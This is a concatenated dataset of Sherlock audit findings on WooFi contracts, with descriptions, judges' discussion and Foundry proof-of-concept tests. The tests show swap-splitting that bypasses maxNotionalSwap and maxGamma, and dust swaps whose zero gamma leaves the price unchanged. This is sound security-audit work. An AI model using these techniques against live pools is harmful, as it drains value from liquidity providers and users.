may delete or edit your escalation comment anytime before the 48-hour escalation window closes. After that, the escalation becomes final.\nWangSecurity\nAgree with everything that tapir says above, but want to note that I've consulted with the head of judging before making this decision. But, I agree that I may have phrased the problem not very clearly and will send what I've said to the head of judging about it.\nMy message: ""in some issues the problem is that tokens don't have chainlink's price feed, but the sponsor says they will only use tokens with the feeds.""\nThe head of judging said this doesn't sound like a vulnerability.\nAfter that I also added: ""oh, sorry, I missed for the first one, it allowed to drain the entire pool, but still it required to whitelist tokens without the price feed, which they didn't intend to do."" and head of judging is reacted with a thumbs up emoji.\nI don't say that tapir is wrong and agree with his reasons, therefore, I will accept it decision from the head of judging. Just wanted to note why it's invalidated.\nCzar102\nI think the fact that there are special fragments of code to handle the no oracle cases is a game-changer in this judgment. Without that detail, this would clearly be an admin misconfiguration, but it seems that tokens without a Chainlink feed were intended (or allowed) to be used.\nGiven that it wasn't noted anywhere (to my best knowledge) that this fragment of the code will never be used, i.e. all whitelisted tokens will have a Chainlink feed, I am planning to consider this a valid High severity issue.\nWangSecurity\nGreat issue @mstpr !\nCzar102\nResult: High Unique\nsherlock-admin3\nEscalations have been resolved successfully!\nEscalation status:\nmstpr: accepted"чCode Snippet\nTool used\nManual Review
Potential damages due to incorrect implementation of the ````ZIP```` algorithmчmediumч```\nfallback () external [payable];\nfallback (bytes calldata _input) external [payable] returns (bytes memory _output);\n```\nч`WooracleV2_2.fallback()` is used to post zipped token price and state data to the contract for sake of gas saving. However, the first 4 bytes of zipped data are not reserved to distinguish the `ZIP` call and other normal call's function selector. This would cause `ZIP` calls to be accidentally interpreted as any other functions in the contract, result in unintended exceptions and potential damages.\nAccording solidity's official doc, there are two forms of `fallback()` function `with` or `without` parameter\n```\nfallback () external [payable];\nfallback (bytes calldata _input) external [payable] returns (bytes memory _output);\n```\n\nIf the version with parameters is used, _input will contain the full data sent to the contract (equal to msg.data)\nAs the `_input` data is equal to `msg.data`, the solidity compiler would firstly check if first 4 bytes matches any normal function selectors, and would only execute `fallback(_input)` while no matching. Therefore, in zipped data, the first 4 bytes must be set to some reserved function selector, such as `0x00000000`, with no collision to normal function selectors. And the real zipped data then starts from 5th byte.\nThe following coded PoC shows cases that the zipped data is accidentally interpreted as:\nfunction renounceOwnership(); function setStaleDuration(uint256); function postPrice(address,uint128); function syncTS(uint256);\nAnd the logs:чDiscussion\nfb-alexcq\nFirst your suggested issue right; it may have function collisions. Thanks for pointing it out.\nMore importantly, the frequency is negligible. We have 30 functions there, so collision probability is 30/(2^32) = 0.000000006984919; We typically update our Wooracle in 5 seconds, so a collision only happen once every 1000,000,000 seconds , that is 31 years: https://calculat.io/en/date/seconds/1000000000\nFrom engineering perspective: we utilize this zip fallback function to save calldata's gas consumption, so it's impossible to add another plain 4 bytes to only avoid collision. Even with collusion, our offline script can catch the tx failure and resend it again, it won't cause any disaster.чThis bug would result in unintended exceptions and potential damages such as:\nCollision with normal price post functions might cause users' trades executed on incorrect price and suffer losses.\nCollision with any view function might cause price post to fail silently and hold on trade processing until next submission, and users' trades might be executed on a delayed inexact price.\nCollision with `setStaleDuration()` might cause price freshness check to break down.\nCode Snippet\nTool used\nManual Review
Selling partial base tokens are more profitable then selling in one goчmediumч"```\n// @dev fee is ""100"", coeff = 0.000000001 * 1e18, spread = 0.001 * 1e18 as in the tests\n    // setting fee to a different value is not relevant, attack is still there, just slighly less profitable\n    \n    // @dev sell 1000 in single tx\n    function test_SellBase1Part() public {\n        uint sellWethAmount = 1000 * 1e18;\n        _fundAndApproveAdminAndTapir(1000_0000 * 1e6, sellWethAmount);\n\n        vm.prank(TAPIR);\n        uint receivedUSDC = router.swap(WETH, USDC, sellWethAmount, 0, payable(TAPIR), TAPIR);\n\n        console.log(""Received USDC"", receivedUSDC);\n        console.log(""contract usdc balance"", IERC20(USDC).balanceOf(address(pool)));\n    }\n\n    // @dev sell 500-500 in single tx\n    function test_Sell2Parts() public {\n        uint sellWethAmount = 1000 * 1e18;\n        _fundAndApproveAdminAndTapir(1000_0000 * 1e6, sellWethAmount);\n        \n        uint cumulative;\n        for (uint i; i < 2; ++i) {\n            // sell 5 wei dust\n            vm.prank(TAPIR);\n            uint receivedUSDC = router.swap(WETH, USDC, sellWethAmount / 2, 0, payable(TAPIR), TAPIR);\n            (uint128 price, ) = oracle.woPrice(WETH);\n            cumulative += receivedUSDC;\n        }\n\n        console.log(""Received USDC"", cumulative);\n        console.log(""contract usdc balance"", IERC20(USDC).balanceOf(address(pool)));\n    }\n\n    // @dev sell 1-1-1-1// rest of code. in single tx\n    function test_Sell1000Parts() public {\n        uint sellWethAmount = 1000 * 1e18;\n        _fundAndApproveAdminAndTapir(1000_0000 * 1e6, sellWethAmount);\n        \n        uint cumulative;\n        for (uint i; i < 1000; ++i) {\n            // sell 5 wei dust\n            vm.prank(TAPIR);\n            uint receivedUSDC = router.swap(WETH, USDC, sellWethAmount / 1000, 0, payable(TAPIR), TAPIR);\n            (uint128 price, ) = oracle.woPrice(WETH);\n            cumulative += receivedUSDC;\n        }\n\n        console.log(""Received USDC"", cumulative);\n        console.log(""contract usdc balance"", IERC20(USDC).balanceOf(address(pool)));\n    }\n```\n"ч"Selling base tokens partially instead of one go is always more profitable\nFirst, let's write down our formulas of sellBase tokens for quoteTokens: g: gamma s: spread c: coefficient p: price np: new price (price after selling base tokens)\ng = deltaBase * p * c deltaQuote = deltaBase * p * (1 - (g + s)) np = p * (1 - g)\nHere I graphed both `sellQuote` and `sellBase` functions: https://www.desmos.com/calculator/svmjlxhavw\nAs we can observe, if the price is >1 then the selling base tokens (red in the graph) will start decreasing after it reaches the middle value. Same happens vice versa when price is <1 for selling quote tokens (blue in the graph). This heavily incentivise smaller swaps and heavily disincentives bigger swaps. Also, since selling smaller amounts are ALWAYS more profitable, `maxGamma` and `maxNotionalSwap` values can be bypassed without a loss (even for profits)\nTextual PoC: Now, let's do a textual example to see whether selling 20 base tokens is profitable then selling 2 times 10 base tokens For this example, let's assume: p = 1 c = 0.01 s = 0.1 and there are no swap fees for simplicity.\nFirst, let's sell 20 base tokens: g = 20 * 1 * 0.01 = 0.2 deltaQuote = 20 * 1 * (1 - (0.1 + 0.1)) = 14 quote tokens received will be 14\nNow, let's sell 10 base tokens in 2 times in a single transaction: g1 = 10 * 1 * 0.01 = 0.1 deltaQuote1 = 10 * 1 * (1- (0.1 + 0.1)) = 8 np = 1 * (1 - 0.1) = 0.9 received 8 quote tokens in first sell of 10 base tokens\ng2 = 10 * 0.9 * 0.01 = 0.09 deltaQuote2 = 10 * 0.9 * (1 - (0.1 + 0.09)) = 7.29 received 7.29 quote tokens in second sell of 10 base tokens\nin total 7.29 + 8 = 15.29 quote tokens received! however, if we were to swap 10 tokens in one go we would end up with 14 quote tokens!\nThis also means that swaps that are not possible because of `maxNotionalSwap` can be divided into partial swaps and the end result would be even higher! If the `maxNotionalSwap` is 100K USDC, someone can swap 2 times 50K USDC to receive even higher amount of quote tokens! Hence, the exploit that happent to WooFi would still be possible and even worse since the partial swaps are better than single go.\nHere a test where it compares selling 1000 WETH in one go, 500-500 and 1-1-1-... 1000 times in a single tx:\n```\n// @dev fee is ""100"", coeff = 0.000000001 * 1e18, spread = 0.001 * 1e18 as in the tests\n    // setting fee to a different value is not relevant, attack is still there, just slighly less profitable\n    \n    // @dev sell 1000 in single tx\n    function test_SellBase1Part() public {\n        uint sellWethAmount = 1000 * 1e18;\n        _fundAndApproveAdminAndTapir(1000_0000 * 1e6, sellWethAmount);\n\n        vm.prank(TAPIR);\n        uint receivedUSDC = router.swap(WETH, USDC, sellWethAmount, 0, payable(TAPIR), TAPIR);\n\n        console.log(""Received USDC"", receivedUSDC);\n        console.log(""contract usdc balance"", IERC20(USDC).balanceOf(address(pool)));\n    }\n\n    // @dev sell 500-500 in single tx\n    function test_Sell2Parts() public {\n        uint sellWethAmount = 1000 * 1e18;\n        _fundAndApproveAdminAndTapir(1000_0000 * 1e6, sellWethAmount);\n        \n        uint cumulative;\n        for (uint i; i < 2; ++i) {\n            // sell 5 wei dust\n            vm.prank(TAPIR);\n            uint receivedUSDC = router.swap(WETH, USDC, sellWethAmount / 2, 0, payable(TAPIR), TAPIR);\n            (uint128 price, ) = oracle.woPrice(WETH);\n            cumulative += receivedUSDC;\n        }\n\n        console.log(""Received USDC"", cumulative);\n        console.log(""contract usdc balance"", IERC20(USDC).balanceOf(address(pool)));\n    }\n\n    // @dev sell 1-1-1-1// rest of code. in single tx\n    function test_Sell1000Parts() public {\n        uint sellWethAmount = 1000 * 1e18;\n        _fundAndApproveAdminAndTapir(1000_0000 * 1e6, sellWethAmount);\n        \n        uint cumulative;\n        for (uint i; i < 1000; ++i) {\n            // sell 5 wei dust\n            vm.prank(TAPIR);\n            uint receivedUSDC = router.swap(WETH, USDC, sellWethAmount / 1000, 0, payable(TAPIR), TAPIR);\n            (uint128 price, ) = oracle.woPrice(WETH);\n            cumulative += receivedUSDC;\n        }\n\n        console.log(""Received USDC"", cumulative);\n        console.log(""contract usdc balance"", IERC20(USDC).balanceOf(address(pool)));\n    }\n```\n\nResults: Selling 500-500 instead of 1000 in one go: 3395.800042 USDC more received Selling 1-1-1-1-... 1000 times instead 1000 in one go: 6776.505788 USDC more received!"ч"Discussion\nfb-alexcq\nThanks for the feedback. This is a known scope when designing our SPMM formula. Again we want to follow up with:\nSeems like you're not considering the swap fee\nSplit into multiple small swaps, only can save users from huge slippage, but it won't cause our protocol lose funds, right? 1000 times for 1 each looks like still not profitable to the attacker, right?\nmstpr\nThe protocol will not lose funds, correct. However, the maxGamma and maxNotionalSwap variables will be rendered useless since partial swaps can be used to bypass these checks, making it even profitable to do so.\nfb-alexcq\nThis extreme price-deviation case has already been handled by `price` check (against Chainlink) in our Wooracle's `price` function.\nWangSecurity\nInitially, it was a duplicate of 68, but these are different issues and it presents an unfair formule, therefore, we decided to keep this one as valid.\nWangSecurity\nSponsor said that this AMM model is in fact intended, cause 99% of their swaps are small. But, it wasn't mentioned in the README, therefore, we validate this report as Med due to validation of maxGamma and maxNotionalSwap (core functionality break).\nBanditx0x\n@mstpr I believe the protocol does actually lose funds here:\nThe protocol acts as the liquidity provider\nThe net-result for a trader and LP in a trade is zero-sum.\nIf a trader unfairly avoids slippage by gaming the AMM formula, each $ saved by the trader is lost by the LP\nLmk your thoughts\nBanditx0x\n@fb-alexcq in response to something you brought up in issue 20 (duplicate):\nThanks for the feedback.\nTechnically it is okay to avoid huge slippage by splitting into small swaps, right? BTW, is there a way for attacker to get profits (instead of saving the loss) from the split swap? Better to consider there's a 2-5 bps swap fee.\nI would like to emphasie that although splitting a very large swap into smaller ones reduces slippage in basically all AMM's, this slippage reduction is due to a trade in between swaps arbitraging the price of the AMM back to the correct price in between your multiple swaps. This is a core invariant of all widely used AMM formulas, and has significant second order consequences as detailed in issue #47 . Woofi's current formula is different from any widely used AMM formula in that it requires no -inbetween price corrections to get this slippage discount.\nFor example, in Uniswap v2, Uniswap v3, Curve, Balancer etc it doesn't matter if you swap 100 tokens or 1 token 100 times. As long as no transactions happen in between, the tokens returned will be the same.\nI'd highly reccomend going back to the old formula which was consistent with this invariant unless it allows another type of vulnerability.\nBanditx0x\nEscalate.\nI think it's high severity for above reasons.\nPlease consider this issue along with the reasoning provided in #47 . I believe me and @mstpr are providing different perspectives to the issue despite the same root cause.\nNote that #47 demonstrates an example with a 2% slippage, and will continue to apply at lower slippage %'s so this actually applies even when 99% of the swaps are small.\nSeems like you're not considering the swap fee\nAddressing this: the swap fee is a percentage of the swap size. Therefore splitting a swap into multiple smaller swaps will result in basically the same sum of swap fees.\nThe formula allows certain users (one's that optimise and perfectly calculate swap splitting) a lower slippage. Normal users that use the User Interface or don't perfectly calculate their split sizes don't get the same privilege. Giving extremely advanced users lower AMM prices than everybody else is equivalent to loss of funds for the not-so-savvy swappers.\nsherlock-admin2\nEscalate.\nI think it's high severity for above reasons.\nPlease consider this issue along with the reasoning provided in #47 . I believe me and @mstpr are providing different perspectives to the issue despite the same root cause.\nNote that #47 demonstrates an example with a 2% slippage, and will continue to apply at lower slippage %'s so this actually applies even when 99% of the swaps are small.\nSeems like you're not considering the swap fee\nAddressing this: the swap fee is a percentage of the swap size. Therefore splitting a swap into multiple smaller swaps will result in basically the same sum of swap fees.\nThe formula allows certain users (one's that optimise and perfectly calculate swap splitting) a lower slippage. Normal users that use the User Interface or don't perfectly calculate their split sizes don't get the same privilege. Giving extremely advanced users lower AMM prices than everybody else is equivalent to loss of funds for the not-so-savvy swappers.\nYou've created a valid escalation!\nTo remove the escalation from consideration: Delete your comment.\nYou may delete or edit your escalation comment anytime before the 48-hour escalation window closes. After that, the escalation becomes final.\nmstpr\n@Banditx0x\nIf this is design choice, then someone making partial swaps will get more tokens, and yes, this would be loss of funds. Additionally, the maxGamma and maxNotionalSwap can easily be bypassed.\nExample: If selling 10 base tokens should receive 5 quote tokens, and if someone selling 2-2-2-2-2 base tokens and receives 7 quote tokens at the end, than the 2 quote tokens would be the loss of protocol since they don't want this to happen in their AMM. Hence, high could be considered.\nI think you are right with your comments, if this is design choice, then high would be appropriate.\nWangSecurity\nI believe it should remain medium cause, essentially, it is expected behaviour by the protocol which was confirmed by the sponsor. But, I believe breaking maxGamma and maxNotionalSwap is breaking core functionality, therefore, it's medium and not enough for a high.\nI don't say that watsons above are wrong, I see and understand their points and will accept any decision by the head of judging.\nCzar102\nKudos to @Banditx0x @mstpr for the deep understanding of the math.\nAs much as I like this finding, I don't think it presents a loss of funds per se, and there are no earnings to the ""exploiters"", the total (and marginal!) slippage still increases as more volume goes in any way. This is a math inconsistency, and I would be considering it as a borderline Low/Medium severity issue.\nGiven that an escalation only exists to increase the severity, I'm planning to reject it and leave the issue as is, and I will not consider downgrading this issue.\nfb-alexcq\n@mstpr @Banditx0x thanks for detailed follow and explanation.\nCould you please send me the whole file of your foundry test, so that I can run it here in my environment? so that to better verify your raised issues.\nBTW, could you also try your attach vector on our newly deployed WooPP going live this Monday? https://arbiscan.io/address/0xed9e3f98bbed560e66b89aac922e29d4596a9642 Is that possible to profit or swap for more tokens here in our new version?\nmstpr\n@fb-alexcq I plugged in the numbers from deployment to my desmos graph. With current values, if someone swaps 14_350 BTC they get ""0"" usdc token in exchange.\nAnother example: if you sell 1M USDC in one go you get: 14.41563574 WBTC\nif you sell 1M USDC in 1000 iterations (1000, 1000, 1000....) you get: 14.42278414 WBTC\nthe difference is 0.0071484 WBTC, 500$\ntest (directly points the current deployment shared above) https://gist.github.com/mstpr/0a099688cb48cdc6bec42ceb1c322e8c\nfb-alexcq\nOK. Cool, Thanks.\nThis result is with Chainlink Oracle Guardian (+-5%) set up right ?\nmstpr\nKudos to @Banditx0x @mstpr for the deep understanding of the math.\nAs much as I like this finding, I don't think it presents a loss of funds per se, and there are no earnings to the ""exploiters"", the total (and marginal!) slippage still increases as more volume goes in any way. This is a math inconsistency, and I would be considering it as a borderline Low/Medium severity issue.\nGiven that an escalation only exists to increase the severity, I'm planning to reject it and leave the issue as is, and I will not consider downgrading this issue.\nWhat about looking at this angle?\nIf this is design choice, then swapping 1M USDC should result at 10 BTC. However, if you swap partially up to 1M USDC then you will end up with say 100 BTC. This 90 BTC difference is basically loss of funds for Woofi considering their design choice, right?\nCzar102\n@mstpr this is not a design choice, this is a math inconsistency, as I noted above.\nAs long as ""it's fine"" for the user to get 100 BTC for 1m USDC, then it's not loss of funds, but suboptimal strategy of the 1M USDC <> 10 BTC swapper. But given that the discrepancy in this case is rather minimal (we won't have 90% slippage), I stand by my previous comment.\nCzar102\nResult: Medium Has duplicates\nsherlock-admin3\nEscalations have been resolved successfully!\nEscalation status:\nbanditx0x: rejected"чBreaking the `maxNotionalSwap` amount and unfair AMM model\nCode Snippet\nTool used\nManual Review
WooFi oracle can fail to validate its price with Chainlink price feedчmediumч```\nfunction _cloPriceInQuote(address _fromToken, address _toToken)\n        internal\n        view\n        returns (uint256 refPrice, uint256 refTimestamp)\n    {\n        address baseOracle = clOracles[_fromToken].oracle;\n        if (baseOracle == address(0)) {\n            return (0, 0);\n        }\n        address quoteOracle = clOracles[_toToken].oracle;\n        uint8 quoteDecimal = clOracles[_toToken].decimal;\n\n        (, int256 rawBaseRefPrice, , uint256 baseUpdatedAt, ) = AggregatorV3Interface(baseOracle).latestRoundData();\n        (, int256 rawQuoteRefPrice, , uint256 quoteUpdatedAt, ) = AggregatorV3Interface(quoteOracle).latestRoundData();\n        uint256 baseRefPrice = uint256(rawBaseRefPrice);\n        uint256 quoteRefPrice = uint256(rawQuoteRefPrice);\n\n        // NOTE: Assume wooracle token decimal is same as chainlink token decimal.\n        uint256 ceoff = uint256(10)**quoteDecimal;\n        refPrice = (baseRefPrice * ceoff) / quoteRefPrice;\n        refTimestamp = baseUpdatedAt >= quoteUpdatedAt ? quoteUpdatedAt : baseUpdatedAt;\n    }\n```\nч"The price precision that the WooOracle uses is 8. However, if the quote token is an expensive token or the base token is a very cheap token, then the price will be too less in decimals and even ""0"" in some cases. This will lead to inefficient trades or inability to compare the woofi price with chainlink price due to chainlink price return with ""0"" value.\nFirst, let's see how the chainlink price is calculated:\n```\nfunction _cloPriceInQuote(address _fromToken, address _toToken)\n        internal\n        view\n        returns (uint256 refPrice, uint256 refTimestamp)\n    {\n        address baseOracle = clOracles[_fromToken].oracle;\n        if (baseOracle == address(0)) {\n            return (0, 0);\n        }\n        address quoteOracle = clOracles[_toToken].oracle;\n        uint8 quoteDecimal = clOracles[_toToken].decimal;\n\n        (, int256 rawBaseRefPrice, , uint256 baseUpdatedAt, ) = AggregatorV3Interface(baseOracle).latestRoundData();\n        (, int256 rawQuoteRefPrice, , uint256 quoteUpdatedAt, ) = AggregatorV3Interface(quoteOracle).latestRoundData();\n        uint256 baseRefPrice = uint256(rawBaseRefPrice);\n        uint256 quoteRefPrice = uint256(rawQuoteRefPrice);\n\n        // NOTE: Assume wooracle token decimal is same as chainlink token decimal.\n        uint256 ceoff = uint256(10)**quoteDecimal;\n        refPrice = (baseRefPrice * ceoff) / quoteRefPrice;\n        refTimestamp = baseUpdatedAt >= quoteUpdatedAt ? quoteUpdatedAt : baseUpdatedAt;\n    }\n```\n\nNow, let's assume the quote token is WBTC price of 60,000$ and the baseToken is tokenX that has the price of 0.0001$. When the final price is calculated atrefPrice because of the divisions in solidity, the result will be ""0"" as follows: 60_000 * 1e8 * 1e8 / 0.0001 * 1e8 = 0\nso the return amount will be ""0"".\nWhen the derived chainlink price is compared with woofi oracle if the chainlink price is ""0"" then the `woPriceInBound` will be set to ""true"" assuming the chainlink price is not set. However, in our case that's not the case, the price returnt ""0"" because of divisions:\n```\n-> bool woPriceInBound = cloPrice_ == 0 ||\n            ((cloPrice_ * (1e18 - bound)) / 1e18 <= woPrice_ && woPrice_ <= (cloPrice_ * (1e18 + bound)) / 1e18);\n\n        if (woFeasible) {\n            priceOut = woPrice_;\n            feasible = woPriceInBound;\n        }\n```\n\nIn such scenario, the chainlink comparison between woofi and chainlink price will not give correct results. The oracle will not be able to detect whether the chainlink price is in ""bound"" with the woofi's returnt price.\nThis also applies if a baseToken price crushes. If the token price gets very less due to market, regardless of the quoteToken being WBTC or USDC the above scenario can happen."ч"
Swaps can happen without changing the price for the next trade due to gamma = 0чmediumч"```\nfunction _calcQuoteAmountSellBase(\n        address baseToken,\n        uint256 baseAmount,\n        IWooracleV2.State memory state\n    ) private view returns (uint256 quoteAmount, uint256 newPrice) {\n        require(state.woFeasible, ""WooPPV2: !ORACLE_FEASIBLE"");\n\n        DecimalInfo memory decs = decimalInfo(baseToken);\n\n        // gamma = k * price * base_amount; and decimal 18\n        uint256 gamma;\n        {\n            uint256 notionalSwap = (baseAmount * state.price * decs.quoteDec) / decs.baseDec / decs.priceDec;\n            require(notionalSwap <= tokenInfos[baseToken].maxNotionalSwap, ""WooPPV2: !maxNotionalValue"");\n\n            gamma = (baseAmount * state.price * state.coeff) / decs.priceDec / decs.baseDec;\n            require(gamma <= tokenInfos[baseToken].maxGamma, ""WooPPV2: !gamma"");\n\n            // Formula: quoteAmount = baseAmount * oracle.price * (1 - oracle.k * baseAmount * oracle.price - oracle.spread)\n            quoteAmount =\n                (((baseAmount * state.price * decs.quoteDec) / decs.priceDec) *\n                    (uint256(1e18) - gamma - state.spread)) /\n                1e18 /\n                decs.baseDec;\n        }\n\n        // newPrice = oracle.price * (1 - k * oracle.price * baseAmount)\n        newPrice = ((uint256(1e18) - gamma) * state.price) / 1e18;\n    }\n```\n"ч"When a swap happens in WoofiPool the price is updated accordingly respect to such value ""gamma"". However, there are some cases where the swap results to a ""gamma"" value of ""0"" which will not change the new price for the next trade.\nThis is how the quote token received and new price is calculated when given amount of base tokens are sold to the pool:\n```\nfunction _calcQuoteAmountSellBase(\n        address baseToken,\n        uint256 baseAmount,\n        IWooracleV2.State memory state\n    ) private view returns (uint256 quoteAmount, uint256 newPrice) {\n        require(state.woFeasible, ""WooPPV2: !ORACLE_FEASIBLE"");\n\n        DecimalInfo memory decs = decimalInfo(baseToken);\n\n        // gamma = k * price * base_amount; and decimal 18\n        uint256 gamma;\n        {\n            uint256 notionalSwap = (baseAmount * state.price * decs.quoteDec) / decs.baseDec / decs.priceDec;\n            require(notionalSwap <= tokenInfos[baseToken].maxNotionalSwap, ""WooPPV2: !maxNotionalValue"");\n\n            gamma = (baseAmount * state.price * state.coeff) / decs.priceDec / decs.baseDec;\n            require(gamma <= tokenInfos[baseToken].maxGamma, ""WooPPV2: !gamma"");\n\n            // Formula: quoteAmount = baseAmount * oracle.price * (1 - oracle.k * baseAmount * oracle.price - oracle.spread)\n            quoteAmount =\n                (((baseAmount * state.price * decs.quoteDec) / decs.priceDec) *\n                    (uint256(1e18) - gamma - state.spread)) /\n                1e18 /\n                decs.baseDec;\n        }\n\n        // newPrice = oracle.price * (1 - k * oracle.price * baseAmount)\n        newPrice = ((uint256(1e18) - gamma) * state.price) / 1e18;\n    }\n```\n\nNow, let's assume: DAI is quoteToken, 18 decimals tokenX is baseToken which has a price of 0.01 DAI, 18 decimals coefficient = 0.000000001 * 1e18 spread = 0.001 * 1e18 baseAmount (amount of tokenX are sold) = 1e10;\nfirst calculate the gamma: (baseAmount * state.price * state.coeff) / decs.priceDec / decs.baseDec; = 1e10 * 0.01 * 1e8 * 0.000000001 * 1e18 / 1e8 / 1e18 = 0 due to round down\nlet's calculate the `quoteAmount` will be received: `quoteAmount` = (((baseAmount * state.price * decs.quoteDec) / decs.priceDec) * (uint256(1e18) - gamma - state.spread)) / 1e18 / decs.baseDec; (1e10 * 0.01 * 1e8 * 1e18 / 1e8) * (1e18 - 0 - 0.01 * 1e18) / 1e18 / 1e18 = 99900000 which is not ""0"".\nlet's calculate the new price: newPrice = ((uint256(1e18) - gamma) * state.price) / 1e18; = (1e18 - 0) * 0.01 * 1e8 / 1e18 = 0.01 * 1e8 which is the same price, no price changes!\nThat would also means if the ""gamma"" is ""0"", then this is the best possible swap outcome. If a user does this in a for loop multiple times in a cheap network, user can trade significant amount of tokens without changing the price.\nCoded PoC (values are the same as in the above textual scenario):\n```\nfunction test_SwapsHappenPriceIsNotUpdatedDueToRoundDown() public {\n        // USDC --> DAI address, mind the naming..\n        uint usdcAmount = 1_000_000 * 1e18;\n        uint wooAmount = 100_000 * 1e18;\n        uint wethAmount = 1_000 * 1e18;\n        deal(USDC, ADMIN, usdcAmount);\n        deal(WOO, ADMIN, wooAmount);\n        deal(WETH, ADMIN, wethAmount);\n\n        vm.startPrank(ADMIN);\n        IERC20(USDC).approve(address(pool), type(uint256).max);\n        IERC20(WOO).approve(address(pool), type(uint256).max);\n        IERC20(WETH).approve(address(pool), type(uint256).max);\n        pool.depositAll(USDC);\n        pool.depositAll(WOO);\n        pool.depositAll(WETH);\n        vm.stopPrank();\n\n        uint wooAmountForTapir = 1e10 * 1000;\n        vm.startPrank(TAPIR);\n        deal(WOO, TAPIR, wooAmountForTapir);\n        IERC20(USDC).approve(address(router), type(uint256).max);\n        IERC20(WOO).approve(address(router), type(uint256).max);\n        IERC20(WETH).approve(address(router), type(uint256).max);\n        vm.stopPrank();\n\n        // WHERE THE MAGIC HAPPENS\n        (uint128 price, ) = oracle.woPrice(WOO);\n        console.log(""price"", price);\n        \n        uint cumulative;\n        for (uint i = 0; i < 1000; ++i) {\n            vm.prank(TAPIR);\n            cumulative += router.swap(WOO, USDC, wooAmountForTapir / 1000, 0, payable(TAPIR), TAPIR);\n        }\n\n        (uint128 newPrice, ) = oracle.woPrice(WOO);\n        console.log(""price"", price);\n\n        // price hasnt changed although there are significant amount of tokens are being traded by TAPIR\n        assertEq(newPrice, price);\n    }\n```\n"ч"if the ""gamma"" is ""0"", then revert.\nDiscussion\nfb-alexcq\nThanks for the feedback.\nIn your example, your DAI amount is 1e10, which 10^-8 usdc in notional value. With such a small amount, zero gamma looks good here. Could you please come up another test case, with a swap amount at least great than 1 usd (and with swap fee) ?\nThanks in advance.\nWangSecurity\nrequest poc\nsherlock-admin3\nPoC requested from @mstpr\nRequests remaining: 6\nWangSecurity\nlook at the comment above by the sponsor\nmstpr\n@fb-alexcq @WangSecurity It all comes down to the network cheapness and coefficient/spread values, if the network is cheap, then doing a many iterations with dust amount will lead to the situation above.\nthe below example has: pool.setFeeRate(WOO, 1000); uint64 private constant INITIAL_SPREAD_WOO = 0.001 * 1e18; uint64 private constant INITIAL_COEFF_WOO = 0.00000000000000001 * 1e18; uint128 private constant INITIAL_PRICE_WOO = 0.01 * 1e8;\nswapping 1 WOO, 1000 times in single tx, receives 9.98 DAI in return without changing the price. If done with more iterations the impact is higher.\n```\nfunction test_SwapsHappenPriceIsNotUpdatedDueToRoundDown() public {\n        // USDC --> DAI address, mind the naming..\n        uint usdcAmount = 1_000_000 * 1e18;\n        uint wooAmount = 100_000 * 1e18;\n        uint wethAmount = 1_000 * 1e18;\n        deal(USDC, ADMIN, usdcAmount);\n        deal(WOO, ADMIN, wooAmount);\n        deal(WETH, ADMIN, wethAmount);\n\n        vm.startPrank(ADMIN);\n        IERC20(USDC).approve(address(pool), type(uint256).max);\n        IERC20(WOO).approve(address(pool), type(uint256).max);\n        IERC20(WETH).approve(address(pool), type(uint256).max);\n        pool.depositAll(USDC);\n        pool.depositAll(WOO);\n        pool.depositAll(WETH);\n        vm.stopPrank();\n\n        uint wooAmountForTapir = 1e18 * 1000;\n        vm.startPrank(TAPIR);\n        deal(WOO, TAPIR, wooAmountForTapir);\n        IERC20(USDC).approve(address(router), type(uint256).max);\n        IERC20(WOO).approve(address(router), type(uint256).max);\n        IERC20(WETH).approve(address(router), type(uint256).max);\n        vm.stopPrank();\n\n        // WHERE THE MAGIC HAPPENS\n        (uint128 price, ) = oracle.woPrice(WOO);\n        console.log(""price"", price);\n        \n        uint cumulative;\n        for (uint i = 0; i < 1000; ++i) {\n            vm.prank(TAPIR);\n            cumulative += router.swap(WOO, USDC, wooAmountForTapir / 1000, 0, payable(TAPIR), TAPIR);\n        }\n\n        (uint128 newPrice, ) = oracle.woPrice(WOO);\n        console.log(""price"", price);\n\n        console.log(""Cumulative"", cumulative);\n\n        // price hasnt changed although there are significant amount of tokens are being traded by TAPIR\n        assertEq(newPrice, price);\n    }\n```\n\nfb-alexcq\nFor me, it still looks legit when the swap amount is so small (with such a low coef slippage), the gamma could be 0. You think about when you trade 1 dai to usdc, you probably ended up with no slippage.\nBut to make the judgement more rigorous, I'm double checking with our algorithm dev.\nWangSecurity\n@fb-alexcq have you checked with the algorithm dev?\nfb-alexcq\nWe decided to give the credit to the Watson. And have been come up with this fix: https://github.com/woonetwork/WooPoolV2/pull/114\nIn engineering perspective, it's impossible to deduce a zero gamma, but we decided to take more sanity check here , w/o costing too much gas.\nBanditx0x\nInteresting, I saw that gamma rounding could be infavor of user but didn't think it could result in anything signficant as it would only be off by 1. Nice one"чAs by design, the price should change after every trade irrelevant of the amount that is being traded. Also, in a cheap network the attack can be quite realistic. Hence, I'll label this as medium.\nCode Snippet\nTool used\nManual Review
In the function _handleERC20Received, the fee was incorrectly chargedчmediumч```\n} else {\n    // Deduct the external swap fee\n    uint256 fee = (bridgedAmount * dstExternalFeeRate) / FEE_BASE;\n    bridgedAmount -= fee;  // @@audit: fee should not be applied to internal swap \n\n    TransferHelper.safeApprove(bridgedToken, address(wooRouter), bridgedAmount);\n    if (dst1inch.swapRouter != address(0)) {\n        try\n            wooRouter.externalSwap(\n```\nчIn the function _handleERC20Received, the fee was incorrectly charged.\nIn the contract, when external swap occurs, a portion of the fee will be charged. However, in function _handleERC20Received, the fee is also charged in internal swap.\n```\n} else {\n    // Deduct the external swap fee\n    uint256 fee = (bridgedAmount * dstExternalFeeRate) / FEE_BASE;\n    bridgedAmount -= fee;  // @@audit: fee should not be applied to internal swap \n\n    TransferHelper.safeApprove(bridgedToken, address(wooRouter), bridgedAmount);\n    if (dst1inch.swapRouter != address(0)) {\n        try\n            wooRouter.externalSwap(\n```\n\nAt the same time, when the internal swap fails, this part of the fee will not be returned to the user.ч
